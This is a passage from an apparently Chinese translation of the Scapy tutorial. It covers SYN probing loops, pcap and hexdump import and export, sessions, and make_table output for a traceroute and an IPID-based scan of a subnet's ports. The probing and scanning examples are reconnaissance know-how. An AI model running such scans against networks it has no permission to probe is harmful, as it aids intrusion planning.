<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>srloop(IP(dst=<span class="string">"www.target.com/30"</span>)/TCP())</span><br><span class="line">RECV <span class="number">1</span>: Ether / IP / TCP <span class="number">192.168</span><span class="number">.11</span><span class="number">.99</span>:<span class="number">80</span> &gt; <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> SA / Padding</span><br><span class="line">fail <span class="number">3</span>: IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.96</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.98</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.97</span>:<span class="number">80</span> S</span><br><span class="line">RECV <span class="number">1</span>: Ether / IP / TCP <span class="number">192.168</span><span class="number">.11</span><span class="number">.99</span>:<span class="number">80</span> &gt; <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> SA / Padding</span><br><span class="line">fail <span class="number">3</span>: IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.96</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.98</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.97</span>:<span class="number">80</span> S</span><br><span class="line">RECV <span class="number">1</span>: Ether / IP / TCP <span class="number">192.168</span><span class="number">.11</span><span class="number">.99</span>:<span class="number">80</span> &gt; <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> SA / Padding</span><br><span class="line">fail <span class="number">3</span>: IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.96</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.98</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.97</span>:<span class="number">80</span> S</span><br><span class="line">RECV <span class="number">1</span>: Ether / IP / TCP <span class="number">192.168</span><span class="number">.11</span><span class="number">.99</span>:<span class="number">80</span> &gt; <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> SA / Padding</span><br><span class="line">fail <span class="number">3</span>: IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.96</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.98</span>:<span class="number">80</span> S</span><br><span class="line">        IP / TCP <span class="number">192.168</span><span class="number">.8</span><span class="number">.14</span>:<span class="number">20</span> &gt; <span class="number">192.168</span><span class="number">.11</span><span class="number">.97</span>:<span class="number">80</span> S</span><br></pre></td></tr></table></figure>



<h3 id="Importing-and-Exporting-Data"><a href="#Importing-and-Exporting-Data" class="headerlink" title="Importing and Exporting Data"></a>Importing and Exporting Data</h3><h4 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h4><p> 通常可以将数据包保存为pcap文件以备后用，或者是供其他的应用程序使用： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>wrpcap(<span class="string">"temp.cap"</span>,pkts)</span><br></pre></td></tr></table></figure>

<p> 还原之前保存的pcap文件： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts = rdpcap(<span class="string">"temp.cap"</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts = sniff(offline=<span class="string">"temp.cap"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Hexdump"><a href="#Hexdump" class="headerlink" title="Hexdump"></a>Hexdump</h4><p>Scapy允许你以不同的十六进制格式输出编码的数据包。</p>
<p>使用<code>hexdump()</code>函数会以经典的hexdump格式输出数据包：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hexdump(pkt)</span><br><span class="line"><span class="number">0000</span>   <span class="number">00</span> <span class="number">50</span> <span class="number">56</span> FC CE <span class="number">50</span> <span class="number">00</span> <span class="number">0</span>C  <span class="number">29</span> <span class="number">2</span>B <span class="number">53</span> <span class="number">19</span> <span class="number">08</span> <span class="number">00</span> <span class="number">45</span> <span class="number">00</span>   .PV..P..)+S...E.</span><br><span class="line"><span class="number">0010</span>   <span class="number">00</span> <span class="number">54</span> <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span>  <span class="number">5</span>A <span class="number">7</span>C C0 A8 <span class="number">19</span> <span class="number">82</span> <span class="number">04</span> <span class="number">02</span>   .T..@.@.Z|......</span><br><span class="line"><span class="number">0020</span>   <span class="number">02</span> <span class="number">01</span> <span class="number">08</span> <span class="number">00</span> <span class="number">9</span>C <span class="number">90</span> <span class="number">5</span>A <span class="number">61</span>  <span class="number">00</span> <span class="number">01</span> E6 DA <span class="number">70</span> <span class="number">49</span> B6 E5   ......Za....pI..</span><br><span class="line"><span class="number">0030</span>   <span class="number">08</span> <span class="number">00</span> <span class="number">08</span> <span class="number">09</span> <span class="number">0</span>A <span class="number">0</span>B <span class="number">0</span>C <span class="number">0</span>D  <span class="number">0</span>E <span class="number">0</span>F <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>   ................</span><br><span class="line"><span class="number">0040</span>   <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">1</span>A <span class="number">1</span>B <span class="number">1</span>C <span class="number">1</span>D  <span class="number">1</span>E <span class="number">1</span>F <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span>   .......... !<span class="string">"#$%</span></span><br><span class="line"><span class="string">0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35   &amp;'()*+,-./012345</span></span><br><span class="line"><span class="string">0060   36 37                                              67</span></span><br></pre></td></tr></table></figure>

<p> 使用<code>import_hexcap()</code>函数可以将以上的hexdump重新导入到Scapy中： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt_hex = Ether(import_hexcap())</span><br><span class="line"><span class="number">0000</span>   <span class="number">00</span> <span class="number">50</span> <span class="number">56</span> FC CE <span class="number">50</span> <span class="number">00</span> <span class="number">0</span>C  <span class="number">29</span> <span class="number">2</span>B <span class="number">53</span> <span class="number">19</span> <span class="number">08</span> <span class="number">00</span> <span class="number">45</span> <span class="number">00</span>   .PV..P..)+S...E.</span><br><span class="line"><span class="number">0010</span>   <span class="number">00</span> <span class="number">54</span> <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span>  <span class="number">5</span>A <span class="number">7</span>C C0 A8 <span class="number">19</span> <span class="number">82</span> <span class="number">04</span> <span class="number">02</span>   .T..@.@.Z|......</span><br><span class="line"><span class="number">0020</span>   <span class="number">02</span> <span class="number">01</span> <span class="number">08</span> <span class="number">00</span> <span class="number">9</span>C <span class="number">90</span> <span class="number">5</span>A <span class="number">61</span>  <span class="number">00</span> <span class="number">01</span> E6 DA <span class="number">70</span> <span class="number">49</span> B6 E5   ......Za....pI..</span><br><span class="line"><span class="number">0030</span>   <span class="number">08</span> <span class="number">00</span> <span class="number">08</span> <span class="number">09</span> <span class="number">0</span>A <span class="number">0</span>B <span class="number">0</span>C <span class="number">0</span>D  <span class="number">0</span>E <span class="number">0</span>F <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>   ................</span><br><span class="line"><span class="number">0040</span>   <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">1</span>A <span class="number">1</span>B <span class="number">1</span>C <span class="number">1</span>D  <span class="number">1</span>E <span class="number">1</span>F <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span>   .......... !<span class="string">"#$%</span></span><br><span class="line"><span class="string">0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35   &amp;'()*+,-./012345</span></span><br><span class="line"><span class="string">0060   36 37                                              67</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; pkt_hex</span></span><br><span class="line"><span class="string">&lt;Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP  version=4L</span></span><br><span class="line"><span class="string">ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c</span></span><br><span class="line"><span class="string">src=192.168.25.130 dst=4.2.2.1 options='' |&lt;ICMP  type=echo-request code=0</span></span><br><span class="line"><span class="string">chksum=0x9c90 id=0x5a61 seq=0x1 |&lt;Raw  load='\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n</span></span><br><span class="line"><span class="string">\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e</span></span><br><span class="line"><span class="string">\x1f !"</span><span class="comment">#$%&amp;\'()*+,-./01234567' |&gt;&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Binary-string"><a href="#Binary-string" class="headerlink" title="Binary string"></a>Binary string</h4><p> 使用raw<code>()</code>函数可以将整个数据包转换成二进制字符串： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkts = sniff(count = <span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt = pkts[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt</span><br><span class="line">&lt;Ether  dst=<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fc:ce:<span class="number">50</span> src=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">2</span>b:<span class="number">53</span>:<span class="number">19</span> type=<span class="number">0x800</span> |&lt;IP  version=<span class="number">4L</span></span><br><span class="line">ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">84</span> id=<span class="number">0</span> flags=DF frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=icmp chksum=<span class="number">0x5a7c</span></span><br><span class="line">src=<span class="number">192.168</span><span class="number">.25</span><span class="number">.130</span> dst=<span class="number">4.2</span><span class="number">.2</span><span class="number">.1</span> options=<span class="string">''</span> |&lt;ICMP  type=echo-request code=<span class="number">0</span></span><br><span class="line">chksum=<span class="number">0x9c90</span> id=<span class="number">0x5a61</span> seq=<span class="number">0x1</span> |&lt;Raw  load=<span class="string">'\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n</span></span><br><span class="line"><span class="string">\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e</span></span><br><span class="line"><span class="string">\x1f !"#$%&amp;\'()*+,-./01234567'</span> |&gt;&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt_raw = raw(pkt)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt_raw</span><br><span class="line"><span class="string">'\x00PV\xfc\xceP\x00\x0c)+S\x19\x08\x00E\x00\x00T\x00\x00@\x00@\x01Z|\xc0\xa8</span></span><br><span class="line"><span class="string">\x19\x82\x04\x02\x02\x01\x08\x00\x9c\x90Za\x00\x01\xe6\xdapI\xb6\xe5\x08\x00</span></span><br><span class="line"><span class="string">\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b</span></span><br><span class="line"><span class="string">\x1c\x1d\x1e\x1f !"#$%&amp;\'()*+,-./01234567'</span></span><br></pre></td></tr></table></figure>

<p> 通过选择合适的起始层（例如<code>Ether()</code>），我们可以重新导入二进制字符串。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; new_pkt &#x3D; Ether(pkt_raw)</span><br><span class="line">&gt;&gt;&gt; new_pkt</span><br><span class="line">&lt;Ether  dst&#x3D;00:50:56:fc:ce:50 src&#x3D;00:0c:29:2b:53:19 type&#x3D;0x800 |&lt;IP  version&#x3D;4L</span><br><span class="line">ihl&#x3D;5L tos&#x3D;0x0 len&#x3D;84 id&#x3D;0 flags&#x3D;DF frag&#x3D;0L ttl&#x3D;64 proto&#x3D;icmp chksum&#x3D;0x5a7c</span><br><span class="line">src&#x3D;192.168.25.130 dst&#x3D;4.2.2.1 options&#x3D;&#39;&#39; |&lt;ICMP  type&#x3D;echo-request code&#x3D;0</span><br><span class="line">chksum&#x3D;0x9c90 id&#x3D;0x5a61 seq&#x3D;0x1 |&lt;Raw  load&#x3D;&#39;\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n</span><br><span class="line">\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e</span><br><span class="line">\x1f !&quot;#$%&amp;\&#39;()*+,-.&#x2F;01234567&#39; |&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><p> 使用<code>export_object()</code>函数，Scapy可以数据包转换成base64编码的Python数据结构： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pkt</span><br><span class="line">&lt;Ether  dst=<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fc:ce:<span class="number">50</span> src=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">2</span>b:<span class="number">53</span>:<span class="number">19</span> type=<span class="number">0x800</span> |&lt;IP  version=<span class="number">4L</span></span><br><span class="line">ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">84</span> id=<span class="number">0</span> flags=DF frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=icmp chksum=<span class="number">0x5a7c</span></span><br><span class="line">src=<span class="number">192.168</span><span class="number">.25</span><span class="number">.130</span> dst=<span class="number">4.2</span><span class="number">.2</span><span class="number">.1</span> options=<span class="string">''</span> |&lt;ICMP  type=echo-request code=<span class="number">0</span></span><br><span class="line">chksum=<span class="number">0x9c90</span> id=<span class="number">0x5a61</span> seq=<span class="number">0x1</span> |&lt;Raw  load=<span class="string">'\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n</span></span><br><span class="line"><span class="string">\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span></span><br><span class="line"><span class="string">!"#$%&amp;\'()*+,-./01234567'</span> |&gt;&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>export_object(pkt)</span><br><span class="line">eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST</span><br><span class="line">OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+<span class="number">1</span>rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao</span><br><span class="line">bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT</span><br><span class="line">WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p> 使用<code>import_object()</code>函数，可以将以上输出重新导入到Scapy中： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>new_pkt = import_object()</span><br><span class="line">eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST</span><br><span class="line">OD1OnB6nN6c4cXrvwQmk2U5xA9tgO70XMm+<span class="number">1</span>rA78qdzbfTP/lDfzz7tD4WwmU1C0YiaT2Gqjaiao</span><br><span class="line">bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT</span><br><span class="line">WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>new_pkt</span><br><span class="line">&lt;Ether  dst=<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fc:ce:<span class="number">50</span> src=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">2</span>b:<span class="number">53</span>:<span class="number">19</span> type=<span class="number">0x800</span> |&lt;IP  version=<span class="number">4L</span></span><br><span class="line">ihl=<span class="number">5L</span> tos=<span class="number">0x0</span> len=<span class="number">84</span> id=<span class="number">0</span> flags=DF frag=<span class="number">0L</span> ttl=<span class="number">64</span> proto=icmp chksum=<span class="number">0x5a7c</span></span><br><span class="line">src=<span class="number">192.168</span><span class="number">.25</span><span class="number">.130</span> dst=<span class="number">4.2</span><span class="number">.2</span><span class="number">.1</span> options=<span class="string">''</span> |&lt;ICMP  type=echo-request code=<span class="number">0</span></span><br><span class="line">chksum=<span class="number">0x9c90</span> id=<span class="number">0x5a61</span> seq=<span class="number">0x1</span> |&lt;Raw  load=<span class="string">'\xe6\xdapI\xb6\xe5\x08\x00\x08\t\n</span></span><br><span class="line"><span class="string">\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span></span><br><span class="line"><span class="string">!"#$%&amp;\'()*+,-./01234567'</span> |&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h4><p> 最后可以使用<code>save_session()</code>函数来保存所有的session变量： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'conf'</span>, <span class="string">'new_pkt'</span>, <span class="string">'pkt'</span>, <span class="string">'pkt_export'</span>, <span class="string">'pkt_hex'</span>, <span class="string">'pkt_raw'</span>, <span class="string">'pkts'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>save_session(<span class="string">"session.scapy"</span>)</span><br></pre></td></tr></table></figure>

<p> 使用<code>load_session()</code>函数，在下一次你启动Scapy的时候你就能加载保存的session： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'conf'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>load_session(<span class="string">"session.scapy"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'conf'</span>, <span class="string">'new_pkt'</span>, <span class="string">'pkt'</span>, <span class="string">'pkt_export'</span>, <span class="string">'pkt_hex'</span>, <span class="string">'pkt_raw'</span>, <span class="string">'pkts'</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Making-tables"><a href="#Making-tables" class="headerlink" title="Making tables"></a>Making tables</h3><p>现在我们来演示一下<code>make_table()</code>函数的功能。该函数的需要一个列表和另一个函数（返回包含三个元素的元组）作为参数。第一个元素是表格x轴上的一个值，第二个元素是y轴上的值，第三个原始则是坐标(x,y)对应的值，其返回结果为一个表格。这个函数有两个变种，<code>make_lined_table()</code>和<code>make_tex_table()</code>来复制/粘贴到你的LaTeX报告中。这些函数都可以作为一个结果对象的方法：</p>
<p>在这里，我们可以看到一个多机并行的traceroute（Scapy的已经有一个多TCP路由跟踪功能，待会儿可以看到）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"www.test.fr/30"</span>, ttl=(<span class="number">1</span>,<span class="number">6</span>))/TCP())</span><br><span class="line">Received <span class="number">49</span> packets, got <span class="number">24</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.make_table( <span class="keyword">lambda</span> (s,r): (s.dst, s.ttl, r.src) )</span><br><span class="line">  <span class="number">216.15</span><span class="number">.189</span><span class="number">.192</span>  <span class="number">216.15</span><span class="number">.189</span><span class="number">.193</span>  <span class="number">216.15</span><span class="number">.189</span><span class="number">.194</span>  <span class="number">216.15</span><span class="number">.189</span><span class="number">.195</span></span><br><span class="line"><span class="number">1</span> <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>     <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>     <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span>     <span class="number">192.168</span><span class="number">.8</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span> <span class="number">81.57</span><span class="number">.239</span><span class="number">.254</span>   <span class="number">81.57</span><span class="number">.239</span><span class="number">.254</span>   <span class="number">81.57</span><span class="number">.239</span><span class="number">.254</span>   <span class="number">81.57</span><span class="number">.239</span><span class="number">.254</span></span><br><span class="line"><span class="number">3</span> <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>   <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>   <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span>   <span class="number">213.228</span><span class="number">.4</span><span class="number">.254</span></span><br><span class="line"><span class="number">4</span> <span class="number">213.228</span><span class="number">.3</span><span class="number">.3</span>     <span class="number">213.228</span><span class="number">.3</span><span class="number">.3</span>     <span class="number">213.228</span><span class="number">.3</span><span class="number">.3</span>     <span class="number">213.228</span><span class="number">.3</span><span class="number">.3</span></span><br><span class="line"><span class="number">5</span> <span class="number">193.251</span><span class="number">.254</span><span class="number">.1</span>   <span class="number">193.251</span><span class="number">.251</span><span class="number">.69</span>  <span class="number">193.251</span><span class="number">.254</span><span class="number">.1</span>   <span class="number">193.251</span><span class="number">.251</span><span class="number">.69</span></span><br><span class="line"><span class="number">6</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.174</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.178</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.174</span> <span class="number">193.251</span><span class="number">.241</span><span class="number">.178</span></span><br></pre></td></tr></table></figure>

<p> 这里有个更复杂的例子：从他们的IPID字段中识别主机。我们可以看到172.20.80.200只有22端口做出了应答，而172.20.80.201则对所有的端口都有应答，而且172.20.80.197对25端口没有应答，但对其他端口都有应答。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"172.20.80.192/28"</span>)/TCP(dport=[<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">53</span>,<span class="number">80</span>]))</span><br><span class="line">Received <span class="number">142</span> packets, got <span class="number">25</span> answers, remaining <span class="number">71</span> packets</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.make_table(<span class="keyword">lambda</span> (s,r): (s.dst, s.dport, r.sprintf(<span class="string">"%IP.id%"</span>)))</span><br><span class="line">   <span class="number">172.20</span><span class="number">.80</span><span class="number">.196</span> <span class="number">172.20</span><span class="number">.80</span><span class="number">.197</span> <span class="number">172.20</span><span class="number">.80</span><span class="number">.198</span> <span class="number">172.20</span><span class="number">.80</span><span class="number">.200</span> <span class="number">172.20</span><span class="number">.80</span><span class="number">.201</span></span><br><span class="line"><span class="number">20</span> <span class="number">0</span>             <span class="number">4203</span>          <span class="number">7021</span>          -             <span class="number">11562</span></span><br><span class="line"><span class="number">21</span> <span class="number">0</span>             <span class="number">4204</span>          <span class="number">7022</span>          -             <span class="number">11563</span></span><br><span class="line"><span class="number">22</span> <span class="number">0</span>             <span class="number">4205</span>          <span class="number">7023</span>          <span class="number">11561</span>         <span class="number">11564</span></span><br><span class="line"><span class="number">25</span> <span class="number">0</span>             <span class="number">0</span>             <span class="number">7024</span>          -             <span class="number">11565</span></span><br><span class="line"><span class="number">53</span> <span class="number">0</span>             <span class="number">4207</span>          <span class="number">7025</span>          -             <span class="number">11566</span></span><br><span class="line"><span class="number">80</span> <span class="number">0</span>             <span class="number">4028</span>          <span class="number">7026</span>          -             <span class="number">11567</span></span><br></pre></td></tr></table></figure>

<p> 你在使用TTL和显示接收到的TTL等情况下，它可以很轻松地帮你识别网络拓扑结构。 </p>
<h3 id="Routing"><a href="#Routing" class="headerlink" title="Routing"></a>Routing</h3><p> 现在Scapy有自己的路由表了，所以将你的数据包以不同于操作系统的方式路由： </p>
